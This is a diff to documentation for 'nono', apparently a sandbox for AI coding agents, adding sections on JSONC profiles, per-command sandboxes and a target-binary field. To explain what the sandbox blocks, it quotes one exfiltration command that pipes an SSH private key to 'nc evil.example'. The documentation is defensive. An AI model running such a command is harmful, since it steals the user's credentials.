@@ -5,6 +5,29 @@ description: Scaffolding, schema validation, and tooling for creating custom pro
 
 The `nono profile` command provides scaffolding and tooling for creating custom profiles. Instead of reverse-engineering the JSON structure from existing profiles, you can generate skeleton files, get editor autocomplete via JSON Schema, and access an LLM-oriented authoring guide.
 
+## File Format
+
+Profile files use **JSONC** (JSON with Comments): standard JSON plus `//` line comments, `/* */` block comments, and trailing commas. Both `.json` and `.jsonc` file extensions are accepted.
+
+```jsonc
+{
+  // Extend the official Claude Code profile
+  "extends": "claude-code",
+  "meta": {
+    "name": "my-claude",
+    "description": "Custom Claude profile with extra tooling access",
+  },
+  "filesystem": {
+    "allow": ["/opt/my-tools"], // custom tooling directory
+    "read": ["/etc/my-app"],
+  },
+}
+```
+
+<Tip>
+  When both `my-profile.jsonc` and `my-profile.json` exist, the `.jsonc` file takes priority.
+</Tip>
+
 <Tip>
   For an overview of what profiles are and how they compose with groups, see [Profiles & Groups](/cli/features/profiles-groups).
 </Tip>
@@ -167,7 +190,7 @@ In VS Code, you can also configure schema association in `.vscode/settings.json`
 {
   "json.schemas": [
     {
-      "fileMatch": ["**/profiles/*.json"],
+      "fileMatch": ["**/profiles/*.json", "**/profiles/*.jsonc"],
       "url": "./nono-profile.schema.json"
     }
   ]
@@ -341,7 +364,9 @@ to grant, but also do not want to see in the save-profile prompt on every run:
 }
 ```
 
-This does not grant access and does not hide diagnostics. It only suppresses
+This does not grant access and does not hide diagnostics. Suppressed denials
+still appear in the diagnostic footer annotated with `[save skipped]`, making
+it clear why they are absent from the save prompt. It only suppresses
 matching save-profile suggestions. `filesystem.ignore` is accepted as an alias,
 but the canonical name is deliberately explicit so it is not mistaken for
 allowing the denied path.
@@ -369,6 +394,89 @@ them as `read`, `read_file`, `allow`, or `allow_file` grants.
   }
 }
 ```
+
+## Per-command Sandboxes
+
+The `mediation.commands[].sandbox` field applies a scoped Seatbelt/Landlock sandbox to a specific command when it is invoked through the mediation shim. This lets you grant a credential-fetching tool access to `~/.ssh` or `~/.kube` without exposing those paths to the agent process itself.
+
+```json
+{
+  "mediation": {
+    "commands": [
+      {
+        "name": "kubectl",
+        "sandbox": {
+          "fs_read": ["~/.kube", "~/.config/ddtool"],
+          "fs_write": ["~/.config/ddtool"],
+          "allow_commands": ["ddtool"],
+          "network": { "allowed_hosts": ["*.staging.dog"] }
+        }
+      }
+    ]
+  }
+}
+```
+
+### Sandbox fields
+
+| Field | Type | Default | Description |
+|-------|------|---------|-------------|
+| `fs_read` | `string[]` | `[]` | Directories the command may read. Supports `~`, `$VAR`, `$GIT_ROOT`, and `@git:*` tokens. |
+| `fs_read_file` | `string[]` | `[]` | Individual files the command may read. |
+| `fs_write` | `string[]` | `[]` | Directories the command may write. |
+| `fs_write_file` | `string[]` | `[]` | Individual files the command may write. |
+| `network` | object | `{}` | Network policy. `{}` inherits the session network mode; `{ "block": true }` cuts all network; `{ "allowed_hosts": [...] }` restricts to specific hosts via a local proxy. |
+| `keychain_access` | `bool` | `false` | macOS only. Grants read access to the login keychain DB so the command can retrieve system credentials. |
+| `allow_commands` | `string[]` | `[]` | Commands that may be invoked directly inside this sandbox without re-routing through the mediation shim. Listed binaries bypass the shim and run with the caller's sandbox grants. |
+| `allow_process_exec` | `bool` | `false` | When `false` (default), process-exec is denied except for the command's own binary, the nono-shim, and any `allow_commands` targets. Set to `true` for commands with broad helper sprawl — git hooks, plugin runners, scripting runtimes — where listing every binary is impractical. |
+
+### `allow_process_exec`
+
+By default, a per-command sandbox blocks `process-exec` entirely except for an explicit allowlist (the command itself, the nono-shim, and `allow_commands` targets). This closes the ProxyCommand exfiltration class: a sandboxed `ssh` command with `~/.ssh` read access can no longer shell out to `/bin/sh -c 'cat id_ed25519 | nc evil.example'`.
+
+Commands that legitimately spawn arbitrary subprocesses — hooks, plugin runners, build toolchains — need to opt out:
+
+```json
+{
+  "name": "git",
+  "sandbox": {
+    "allow_commands": ["ssh"],
+    "allow_process_exec": true,
+    "fs_read": [".", "$GIT_ROOT", "@git:hooks-path"]
+  }
+}
+```
+
+<Warning>
+  Setting `allow_process_exec: true` widens the sandbox back to its pre-v0.59.0 behaviour for that command. Any subprocess the command spawns can exec arbitrary binaries within the sandbox's filesystem grants. Use it only for commands where the set of subprocesses is too dynamic to enumerate in `allow_commands`.
+</Warning>
+
+## Target Binary
+
+User profiles can declare a `binary` field to specify the program that nono should execute. This makes the trailing `-- <command>` optional:
+
+```jsonc
+{
+  "extends": "claude-code",
+  "meta": { "name": "my-claude" },
+  "binary": "/home/user/.local/bin/claude"
+}
+```
+
+```bash
+# No trailing command needed — the profile knows what to run
+nono run --profile ./my-claude.jsonc --allow-cwd
+```
+
+If both a profile `binary` and a CLI trailing command are provided, the profile binary takes precedence and a warning is emitted.
+
+### Restrictions
+
+The `binary` field is only honoured for **user-authored profiles** — profiles loaded from a filesystem path (e.g. `./my-profile.jsonc`) or from the user profile directory (`~/.config/nono/profiles/`). Pack and built-in profiles cannot set `binary`; the field is silently ignored for security reasons.
+
+### Inheritance
+
+When profiles are composed via `extends`, the child's `binary` overrides the parent's. If the child does not specify `binary`, it inherits the parent's value.
 
 ## CLI Reference
 
